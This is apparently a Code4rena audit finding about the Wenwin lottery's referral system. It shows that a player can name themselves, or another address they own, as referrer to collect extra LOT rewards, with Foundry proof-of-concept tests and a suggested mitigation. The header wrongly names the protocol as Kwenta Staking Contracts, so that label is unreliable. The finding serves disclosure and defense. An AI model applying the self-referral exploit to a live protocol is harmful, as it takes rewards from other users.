# Anyone can increase their rewards

**Severity:** low/info
**Auditor:** Code4rena
**Protocol:** Kwenta Staking Contracts
**Keywords:** cybersecurity, vulnerability, LOT tokens, referrer exploitation, claim rewards, smart contract, msg.sender, EOA, referral tokens, protocol exploit, impact assessment, proof of concept, manual testing, Foundry, mitigation steps, security check, user awareness, address spoofing, tokenomics, decentralized finance

---

# Lines of code

https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/ReferralSystem.sol#L76-L82
https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/Lottery.sol#L110-L131
https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/ReferralSystem.sol#L136-L154
https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/ReferralSystem.sol#L52-L72


# Vulnerability details

## Impact

Players and referrers are able to claim \u0060LOT\u0060 tokens for purchased tickets, with players taking 5% and referrers taking 3%. However, players can claim 8% by supplying their own address as a referrer.

## Proof of Concept
This line shows that the protocol has taken into account when no referrer was provided, meaning its not a feature to claim referral tokens on your own behalf.

https://github.com/code-423n4/2023-03-wenwin/blob/91b89482aaedf8b8feb73c771d11c257eed997e8/src/ReferralSystem.sol#L60


\u0060\u0060\u0060solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "./LotteryTestBase.sol";
import "../src/Lottery.sol";
import "./TestToken.sol";
import "test/TestHelpers.sol";
import "./ReferralSystemBase.sol";

contract ReferralSystemTest is LotteryTestBase, ReferralSystemBase {
    function setUp() public virtual override(LotteryTestBase, ReferralSystemBase) {
        super.setUp();
        referralSystem = lottery;
    }

    function testReferrerClaim() public {
        testClaimReferrer();
    }
}
\u0060\u0060\u0060

\u0060\u0060\u0060solidity
function testClaimReferrer() public {
        address randomReferrer = makeAddr("randomReferrer");
        uint128 currentDraw = lottery.currentDraw();

        vm.startPrank(user);
        buySameTickets(currentDraw, uint120(0x0F), address(randomReferrer), 1);
        vm.stopPrank();

        executeDraw();

        uint128[] memory drawIds = new uint128[](1);
        drawIds[0] = 0;

        vm.prank(randomReferrer);
        referralSystem.claimReferralReward(drawIds);
        assertEq(lotteryToken.balanceOf(randomReferrer), rewardsToReferrersPerDraw[0]);
        console.log("referrer balance", lotteryToken.balanceOf(randomReferrer)); // 700000000000000000000000

        // Up to here is the test provided by the protocol, below is just to show the rewards received by user
        vm.prank(user);
        referralSystem.claimReferralReward(drawIds);
        assertGt(lotteryToken.balanceOf(user), lotteryToken.balanceOf(randomReferrer));
        console.log("user balance", lotteryToken.balanceOf(user)); // 961538500000000000000000
    }
\u0060\u0060\u0060

Below is a test to show how the user is able to supply his own address and claim extra rewards

\u0060\u0060\u0060solidity
function testClaimReferrer() public {
        address randomReferrer = makeAddr("randomReferrer");
        uint128 currentDraw = lottery.currentDraw();

        vm.startPrank(user);
        buySameTickets(currentDraw, uint120(0x0F), address(user), 1); // user passes their own address as referrer
        vm.stopPrank();

        executeDraw();

        uint128[] memory drawIds = new uint128[](1);
        drawIds[0] = 0;

        vm.prank(user);
        referralSystem.claimReferralReward(drawIds);
        assertGt(lotteryToken.balanceOf(user), rewardsToReferrersPerDraw[0]);
        console.log("user balance", lotteryToken.balanceOf(user)); // 961538500000000000000000 + 700000000000000000000000
    }
\u0060\u0060\u0060

## Tools Used

Foundry/Manual

## Recommended Mitigation Steps

Perhaps there could be a check to ensure \u0060msg.sender != referrer\u0060, but there is nothing stopping the user from passing in another EOA that they own and still exploiting the protocol in this way. Also other users of the protocol who aren\u0027t aware of this, as its not a listed feature, will not have the same benefits.
